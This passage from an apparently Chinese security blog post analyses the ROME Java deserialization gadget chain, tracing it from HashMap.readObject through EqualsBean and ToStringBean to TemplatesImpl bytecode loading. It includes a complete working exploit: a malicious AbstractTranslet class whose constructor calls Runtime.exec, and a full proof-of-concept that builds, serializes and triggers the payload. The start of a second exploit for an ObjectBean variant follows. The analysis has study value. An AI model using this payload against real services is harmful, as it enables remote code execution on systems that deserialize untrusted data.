!= <span class="hljs-literal">null</span> &amp;&amp; pReadMethod.getDeclaringClass() != Object.class &amp;&amp; pReadMethod.getParameterTypes().length == <span class="hljs-number">0</span>) &#123;<br>                        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> pReadMethod.invoke(<span class="hljs-built_in">this</span>._obj, NO_PARAMS);<br>                        <span class="hljs-comment">//反射调用Getter</span><br>                        <span class="hljs-built_in">this</span>.printProperty(sb, prefix + <span class="hljs-string">&quot;.&quot;</span> + pName, value);<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception ex) &#123;<br>            sb.append(<span class="hljs-string">&quot;\n\nEXCEPTION: Could not complete &quot;</span> + <span class="hljs-built_in">this</span>._obj.getClass() + <span class="hljs-string">&quot;.toString(): &quot;</span> + ex.getMessage() + <span class="hljs-string">&quot;\n&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> sb.toString();<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>该方法通过<strong>Java Bean Introspector</strong>（内省机制）枚举某个 bean 类型（<code>this._beanClass</code>）的所有<strong>属性(Property)<strong>，对每个属性找到其</strong>getter</strong>（读方法, read method并调用，获取该属性当前实例对象（**<code>this._obj</code><strong>）上的值，然后将</strong>属性名、前缀、值<strong>格式化并追加到 <strong><code>StringBuffer sb</code></strong> 中，最终返回一个字符串——用于构造该对象的递归&#x2F;层级式属性转储（</strong>debug-friendly toString 输出**）。</p>
<blockquote>
<p>换句话说，它不是普通的 <code>Object#toString()</code> 覆写；它像是一个<strong>调试用、反射驱动的 deep-ish inspection</strong> 工具，把 bean 的全部可读属性名称和值打印出来，属性名称前加上传入的 <code>prefix</code>，适合递归调用（比如嵌套对象时用不同 prefix 展示层级路径）。</p>
</blockquote>
<p>这里的<code>pReadMethod.invoke(this._obj, NO_PARAMS);</code>就是反射，我们可以通过反射来调用<code>Templateslmpl</code>的<code>getOutputProperties()</code>方法，基本思路就是：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Class</span> <span class="hljs-variable">_beanClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">_obj</span> <span class="hljs-operator">=</span> _beanClass.newInstance();<br>            <span class="hljs-type">Method</span> <span class="hljs-variable">pReadMethod</span> <span class="hljs-operator">=</span> _beanClass.getDeclaredMethod(<span class="hljs-string">&quot;getOutputProperties&quot;</span>);<br>            pReadMethod.invoke(_obj,NO_PARAMS);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br></code></pre></td></tr></table></figure>

<p>然后我们发现<code>_obj</code>是可以赋值的</p>
<p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202507172035522.png" srcset="/img/loading.gif" lazyload alt="image-20250717181454012"></p>
<p>然后我们来看一下谁调用了这个<code>ToStringBean.toString(prefix)</code>跟进后发现是，<code>ToStringBean.toString()</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">Stack</span> <span class="hljs-variable">stack</span> <span class="hljs-operator">=</span> (Stack)PREFIX_TL.get();<br>        String[] tsInfo = (String[])(stack.isEmpty() ? <span class="hljs-literal">null</span> : stack.peek());<br>        String prefix;<br>        <span class="hljs-keyword">if</span> (tsInfo == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>._obj.getClass().getName();<br>            prefix = className.substring(className.lastIndexOf(<span class="hljs-string">&quot;.&quot;</span>) + <span class="hljs-number">1</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            prefix = tsInfo[<span class="hljs-number">0</span>];<br>            tsInfo[<span class="hljs-number">1</span>] = prefix;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.toString(prefix);<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>而我们的最终目的地是<code>hashCode</code>的<code>readobject</code>，那我们得找一个链子可以搞到<code>toString</code>——<code>hashCode</code></p>
<h3 id="EqualsBean："><a href="#EqualsBean：" class="headerlink" title="EqualsBean："></a>EqualsBean：</h3><p>而<code>EqualsBean</code>就是 ，其中有两个函数</p>
<p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202507172046577.png" srcset="/img/loading.gif" lazyload alt="image-20250717204626903"></p>
<p>而其中的<code>beanHashCode</code>就是完全符合我们要求的函数</p>
<p>跟进<code>hashCode</code></p>
<p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202507172050648.png" srcset="/img/loading.gif" lazyload alt="image-20250717205029018"></p>
<p><del>到这我突然懵了一下🤦‍嗯？到这一步怎么办，这怎么搞？？？？这怎么调用HashMap啊😭</del>那这是为什么呢？其实原因也很简单，因为我们现在是倒着推的，而_obj.toString() 返回 String（实际上是 ToStringBean 的 toString() 结果）。然后对这个 String 调用 hashCode() → 进入 String.hashCode()，就长上面那样了。而我们利用的顺序是：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs scss">HashMap<span class="hljs-selector-class">.readObject</span>()<br>    ↓<br>HashMap<span class="hljs-selector-class">.hash</span>(Object key)<br>    ↓<br>EqualsBean<span class="hljs-selector-class">.hashCode</span>()  <span class="hljs-comment">// 调用 beanHashCode()</span><br>    ↓<br>EqualsBean<span class="hljs-selector-class">.beanHashCode</span>()<br>    ↓<br>_obj<span class="hljs-selector-class">.toString</span>()        <span class="hljs-comment">// 调用 ToStringBean.toString()</span><br>    ↓<br>ToStringBean<span class="hljs-selector-class">.toString</span>()<span class="hljs-comment">// 反射调用 TemplatesImpl.getOutputProperties()</span><br>    ↓<br>TemplatesImpl<span class="hljs-selector-class">.getOutputProperties</span>()<br>    ↓<br>触发 <span class="hljs-built_in">defineTransletClasses</span>() → 加载恶意字节码 → RCE<br><br></code></pre></td></tr></table></figure>

<p>我们在hashMap那一步传入的key就是EqualsBean</p>
<p><strong><code>HashMap.hash(Object)</code> 实现</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>        <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span><br>        s.defaultReadObject();<br>    	......<br>            <span class="hljs-comment">// Read the keys and values, and put the mappings in the HashMap</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K) s.readObject();<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V) s.readObject();<br>                putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br><br>跟进hash(key)<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hash</span><span class="hljs-params">(Object key)</span> &#123;<br>    <span class="hljs-type">int</span> h;<br>    <span class="hljs-keyword">return</span> (key == <span class="hljs-literal">null</span>) ? <span class="hljs-number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="hljs-number">16</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>我们传入以后，它调用的就是EqualsBean的hashCode()了，然后我们的_obj是传入的ToStringBean，就会继续调用它的toString()，由此一来，我们的链子就成功啦！</p>
<p>书写EXP</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs asciiarmor">main()<br>  ├─ 构造 TemplatesImpl (植入恶意 shell.class)<br>  ├─ 构造 ToStringBean(Templates.class, ConstantTransformer(1))<br>  ├─ 构造 EqualsBean(ToStringBean.class, toStringBean实例)<br>  ├─ map.put(equalsBean, &quot;123&quot;)   // HashMap 里用 EqualsBean 当 key<br>  ├─ 反射把 toStringBean._obj = templates  // 换掉ConstantTransformer(1)，指向恶意对象<br>  ├─ serialize(map)               // 写 ser1.bin<br>  └─ unserialize(&quot;ser1.bin&quot;)      // 触发链<br><br>反序列化触发链（核心）：<br>ObjectInputStream.readObject()<br>  → HashMap.readObject()<br>    → 读入 key/value 并插入<br>    → HashMap.hash(key) 调用 key.hashCode()<br>      → EqualsBean.hashCode()<br>        → EqualsBean.beanHashCode()<br>          → _obj.toString()  // _obj = TemplatesImpl<br>            → TemplatesImpl.toString()（间接：ToStringBean 定位模板类并调用 getter）<br>            → TemplatesImpl.getOutputProperties()<br>              → TemplatesImpl.newTransformer()<br>                → TemplatesImpl.getTransletInstance()<br>                  → TemplatesImpl.defineTransletClasses()<br>                    → defineClass(shell.class bytes)<br>                      → new shell() 构造函数<br>                        → Runtime.getRuntime().exec(&quot;calc&quot;)<br></code></pre></td></tr></table></figure>

<h3 id="TransformerImpl-构造参数含义"><a href="#TransformerImpl-构造参数含义" class="headerlink" title="TransformerImpl 构造参数含义"></a><code>TransformerImpl</code> 构造参数含义</h3><table>
<thead>
<tr>
<th>参数</th>
<th>来源</th>
<th>作用</th>
<th>在漏洞利用中的关注点</th>
</tr>
</thead>
<tbody><tr>
<td><code>getTransletInstance()</code></td>
<td>由 <code>_bytecodes</code> 动态加载的 translet</td>
<td>执行 XML→输出 的核心逻辑</td>
<td>这里实例化时已执行恶意代码；后续不重要</td>
</tr>
<tr>
<td><code>_outputProperties</code></td>
<td><code>Properties</code> 对象（可能为空，后面会由内部填充默认）</td>
<td>标记输出（编码、缩进、method 等）</td>
<td>部分 PoC 会给它一个空 <code>Properties</code> 以避免 NPE</td>
</tr>
<tr>
<td><code>_indentNumber</code></td>
<td>int</td>
<td>控制 pretty print 缩进</td>
<td>默认值即可，与利用无直接关系</td>
</tr>
<tr>
<td><code>_tfactory</code></td>
<td><code>TransformerFactoryImpl</code></td>
<td>让 <code>Transformer</code> 能访问工厂配置（URI Resolver、安全特性等）</td>
<td><strong>必须非空</strong>，否则 <code>newTransformer()</code> 可能抛 <code>NullPointerException</code></td>
</tr>
</tbody></table>
<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><p>把恶意字节码塞进 <code>TemplatesImpl</code>，用 ROME 的 <code>EqualsBean</code> + <code>ToStringBean</code> 把它包起来，作为 HashMap key 序列化；反序列化时 HashMap 调 <code>key.hashCode()</code>，跨过 ROME 的 <code>toString</code> 链最终调用 <code>TemplatesImpl</code> 方法，触发内部加载我们提供的恶意类并实例化，从而执行恶意构造器里的命令。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ROME;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">shell</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">shell</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException&#123;<br>        <span class="hljs-keyword">try</span>&#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-keyword">package</span> REMO;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ROME</span> &#123;<br>    <span class="hljs-comment">//修改字段</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object object, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> object.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(object, value);<br>    &#125;<br>    <span class="hljs-comment">//序列化</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object object)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser1.bin&quot;</span>));<br>        oos.writeObject(object);<br>    &#125;<br>    <span class="hljs-comment">//反序列化</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;ser1.bin&quot;</span>));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//创建一个templates，把恶意字节码写进去</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E:\\\\JavaSec\\\\CC1\\\\target\\\\classes\\\\ROME\\\\shell.class&quot;</span>));<br>        <span class="hljs-comment">//TemplatesImpl 在执行 newTransformer() 或 getOutputProperties() 时，会检查 _name 是否为空（某些 JDK 版本是 _transletName），如果为空会抛异常。</span><br>        setValue(templates,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;ROME&quot;</span>);<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        作用：</span><br><span class="hljs-comment">		将我们编译好的恶意类（shell.class）的字节码注入到 TemplatesImpl。</span><br><span class="hljs-comment">		为什么是 byte[][] 而不是 byte[]？</span><br><span class="hljs-comment">		TemplatesImpl 支持多个 class（通常 Translet 主类 + 辅助类），所以字段类型是 byte[][]。</span><br><span class="hljs-comment">		这里把单个类的字节码放进数组：new byte[][] &#123; bytecodes &#125;。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">		后续行为：</span><br><span class="hljs-comment">		当调用 templates.newTransformer() 时，TemplatesImpl 会：</span><br><span class="hljs-comment">		遍历 _bytecodes，对每个元素调用 defineClass() 定义类。</span><br><span class="hljs-comment">		找出继承 AbstractTranslet 的类，作为主类。</span><br><span class="hljs-comment">		实例化该类 → 执行其构造方法（我们在里面放了Runtime.getRuntime().exec(&quot;calc&quot;)）。</span><br><span class="hljs-comment">		如果不设置 _bytecodes，就没有恶意代码被加载。</span><br><span class="hljs-comment">        */</span><br>        setValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytecodes&#125;);<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        作用：</span><br><span class="hljs-comment">		给 TemplatesImpl 的 _tfactory 字段赋值。</span><br><span class="hljs-comment">		这个字段用于生成 Transformer 实例，是模板内部运行的依赖。</span><br><span class="hljs-comment">		如果不设置，会出现：</span><br><span class="hljs-comment">		java.lang.NullPointerException: _tfactory is null</span><br><span class="hljs-comment">		当执行 newTransformer() 或 getOutputProperties() 时直接 NPE。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">		为什么是 TransformerFactoryImpl？</span><br><span class="hljs-comment">		这是 Xalan XSLTC 的工厂类，TemplatesImpl 原生期望的类型。</span><br><span class="hljs-comment">		不用别的工厂，因为它的代码内部会 cast 成 TransformerFactoryImpl。</span><br><span class="hljs-comment">        */</span><br>        setValue(templates,<span class="hljs-string">&quot;_tfactory&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-comment">//防止提前触发任意类加载，toStringBean的_obj要在hashMap.put之后再通过反射进行赋值，因此这里new ToStringBean的时候会先把new ConstantTransformer(1)塞进去，用来占位</span><br>        <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">toStringBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(Templates.class,<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-comment">//把ToStringBean传入EqualsBean，用来触发hashcode</span><br>        <span class="hljs-type">EqualsBean</span> <span class="hljs-variable">equalsBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EqualsBean</span>(ToStringBean.class,toStringBean);<br><br>        <span class="hljs-comment">//创建HashMap类，用来作为容器调用EqualsBean的hashCode</span><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-comment">//传入</span><br>        map.put(equalsBean,<span class="hljs-string">&quot;123&quot;</span>);<br>        <span class="hljs-comment">//把 ToStringBean._obj 替换成恶意 TemplatesImpl</span><br>        setValue(toStringBean,<span class="hljs-string">&quot;_obj&quot;</span>,templates);<br>        <span class="hljs-comment">//序列化</span><br>        serialize(map);<br>        <span class="hljs-comment">//反序列化触发</span><br>        unserialize(<span class="hljs-string">&quot;ser1.bin&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="其他的链子"><a href="#其他的链子" class="headerlink" title="其他的链子"></a>其他的链子</h3><h4 id="ObjectBean利用链"><a href="#ObjectBean利用链" class="headerlink" title="ObjectBean利用链"></a>ObjectBean利用链</h4><p><code>ObjectBean</code> 相当于一个“万能代理”，快速实现 Bean 常用方法，在<code>ObjectBean</code>类中也有调用<code>EqualsBean</code>的<code>hashCode</code>方法的，我们可以直接用<code>ObjectBean.hashCode()</code>，相当于进行了一个替换</p>
<p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202507181458136.png" srcset="/img/loading.gif" lazyload alt="image-20250718145836473"></p>
<p>利用链就是把<code>EqualsBean.hashCode</code>换成<code>ObjectBean.hashCode</code>：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs scss">HashMap<span class="hljs-selector-class">.readObject</span>()<br>    ↓<br>HashMap<span class="hljs-selector-class">.hash</span>(Object key)<br>    ↓<br>ObjectBean<span class="hljs-selector-class">.hashCode</span>()  <span class="hljs-comment">//这里替换成了ObjectBean.hashCode()</span><br>    ↓<br>EqualsBean<span class="hljs-selector-class">.beanHashCode</span>()<br>    ↓<br>_obj<span class="hljs-selector-class">.toString</span>()        <span class="hljs-comment">// 调用 ToStringBean.toString()</span><br>    ↓<br>ToStringBean<span class="hljs-selector-class">.toString</span>()<span class="hljs-comment">// 反射调用 TemplatesImpl.getOutputProperties()</span><br>    ↓<br>TemplatesImpl<span class="hljs-selector-class">.getOutputProperties</span>()<br>    ↓<br>触发 <span class="hljs-built_in">defineTransletClasses</span>() → 加载恶意字节码 → RCE<br></code></pre></td></tr></table></figure>

<h5 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ROME;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span 